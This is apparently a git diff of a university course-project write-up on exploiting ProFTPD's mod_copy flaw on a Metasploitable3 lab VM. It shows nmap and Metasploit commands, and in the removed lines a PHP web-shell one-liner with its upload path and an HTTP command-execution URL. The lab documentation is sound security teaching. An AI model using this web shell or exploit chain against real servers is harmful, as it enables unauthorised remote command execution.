@@ -8,13 +8,32 @@ This document details Phases 1 of the ICS344 course project into a single, step-
 
 ### 1.1. Environment Deployment
 
-1. **Victim Machine**: Deploy Metasploitable3‑ub1404 as the vulnerable target.
-2. **Attacker Machine**: Deploy Kali Linux with Metasploit Framework.
-3. **Network Configuration**: Ensure both machines are bridged on the same network (e.g., 10.0.2.0/24).
+1. **Attacker Machine**: Deploy Kali Linux with Metasploit Framework.
+
+<figure>
+  <img src="image1.jpg" alt="Kali Linux attacker VM">
+  <figcaption>Figure 1: Kali Linux attacker setup.</figcaption>
+</figure>
+2. **Victim Machine**: Deploy Metasploitable3‑ub1404 as the vulnerable target.
+<figure>
+  <img src="image2.jpg" alt="Metasploitable3 victim VM">
+  <figcaption>Figure 2: Metasploitable3 vulnerable VM deployment.</figcaption>
+</figure>
+3. **Network Configuration**: Ensure both machines are bridged on the same network (e.g., 10.0.2.0/24).
 
 ### 1.2. Identify & Exploit Vulnerable Service
 
-1. **Choose Service**: Identify `proftpd` with `mod_copy` enabled on Metasploitable3.
+1. **Port Scanning**: Use `nmap` to discover open services on the victim.
+
+   ```bash
+   nmap -sV 10.0.2.15
+   ```
+
+<figure>
+  <img src="image3.jpg" alt="Nmap scan showing FTP on port 21">
+  <figcaption>Figure 3: Nmap scan revealing FTP service on port 21.</figcaption>
+</figure>
+
 2. **Launch Metasploit**:
 
    ```bash
@@ -24,24 +43,39 @@ This document details Phases 1 of the ICS344 course project into a single, step-
    set RPORT 21
    set LHOST 10.0.2.12
    set LPORT 4444
-   run
    ```
-3. **Verify Shell**: On success, a shell session opens (`session 4`).
 
 <figure>
-  <img src="/mnt/data/74b60c98-e957-4b1f-98ec-432fffebd0fb.png" alt="Metasploit FTP mod_copy exploit output">
-  <figcaption>Figure 1: Successful `proftpd_modcopy_exec` exploit via Metasploit.</figcaption>
+  <img src="image4.jpg" alt="Metasploit console with module and payload configured">
+  <figcaption>Figure 4: Metasploit console with RHOST, RPORT, LHOST, LPORT, module, and payload set.</figcaption>
 </figure>
 
-### 1.3. Manual Exploitation Script
+3. **Run the Exploit**: Execute the exploit to gain a shell on the victim.
 
-> *Note: A custom Python script was developed to replicate the exploit steps via raw FTP commands and PHP payload upload.*
+   ```bash
+   run  # or exploit
+   ```
 
-1. Connect to FTP, enable `mod_copy` commands.
-2. Upload `<?php system($_GET['cmd']); ?>` as `999EYC.php` to `/var/www/html/`.
-3. Execute via HTTP: `http://10.0.2.15/999EYC.php?cmd=whoami`.
-4. Clean up by deleting the PHP file.
+<figure>
+  <img src="image5.jpg" alt="Metasploit exploit run command output">
+  <figcaption>Figure 5: Running the exploit via `run` or `exploit` command.</figcaption>
+</figure>
 
-> *Screenshots of manual exploit steps and script output are included in the Phase 1 deliverable.*
+4. **Verify Shell Access**: Confirm the session is active (`session 4`) and commands can be executed.
 
----
+   > **Note**: Shell access has been successfully verified, confirming the exploit worked as intended.
+
+### 1.3. Automated Exploitation Script (Tasks 1.2 & 1.3)
+
+1. **Script Creation**: Consolidate manual Metasploit commands into a Bash script (`exploit.sh`).
+2. **Script Execution**: Run the script from the Kali terminal to automatically exploit the vulnerability.
+
+<figure>
+  <img src="image6.jpg" alt="Terminal running automated exploit script">
+  <figcaption>Figure 6: Executing the automated `.sh` script replicating manual exploit commands.</figcaption>
+</figure>
+3. **Script Content**: The Bash file contains `use`, `set`, and `run` commands in sequence.
+<figure>
+  <img src="image7.jpg" alt="Content of automated exploit commands script">
+  <figcaption>Figure 7: Screenshot of the `.sh` file containing automated exploit commands.</figcaption>
+</figure>
